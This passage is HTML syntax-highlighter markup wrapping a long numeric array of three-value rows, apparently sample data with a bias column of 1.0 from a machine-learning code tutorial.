class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.054677</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.406704</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7.067335</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.667394</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.741452</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.46015</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.866805</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.569411</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.548755</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.026632</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.427743</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.850433</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.920334</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.347183</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13.1755</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.176813</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.16702</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.781871</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.097953</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.566606</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.749003</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.931635</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.589505</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.024205</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.151823</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.036453</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.690988</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.196949</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.444165</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.014459</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.754399</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.985298</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.230619</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.693453</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.55754</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.576525</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.778922</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.346811</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.67873</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.124484</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.672471</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.217916</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.597015</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.733928</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.098687</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">3.642001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.618087</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.315985</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.523953</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.416614</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.619232</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.386323</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.989286</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.556921</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8.294984</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.224863</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.58736</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.347803</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.406051</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.196604</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.951851</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.275221</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.543647</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.470575</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.332488</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.889567</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.542662</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.527893</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.150579</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.185247</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.309318</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.445678</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.297303</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.042222</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.105155</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.618787</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.320986</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.152083</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.548467</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.828534</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.676045</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.237728</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.549033</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.683565</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.166125</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.229456</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.921938</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.959885</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.555336</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.492911</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.993324</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.184992</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8.721488</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.355715</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.325976</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.397822</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8.058397</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.824839</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13.730343</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.507278</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.027866</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.099671</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.835839</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.344008</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.717485</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.785928</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7.718645</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.918801</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.560217</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.364009</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.7473</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.841722</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.119083</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.490426</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.960539</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.007194</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.075792</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.356107</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.447863</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.342578</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.281162</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.810823</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.466018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.530777</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.476801</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.296683</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.607559</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.475487</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.040035</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.783277</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.009725</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.074798</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11.02365</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.337472</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.468339</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.102781</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13.763651</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.147324</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.874846</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.518389</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.887035</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.015399</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7.571882</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.658086</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.027255</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.319944</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.171228</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.056216</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.019981</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span 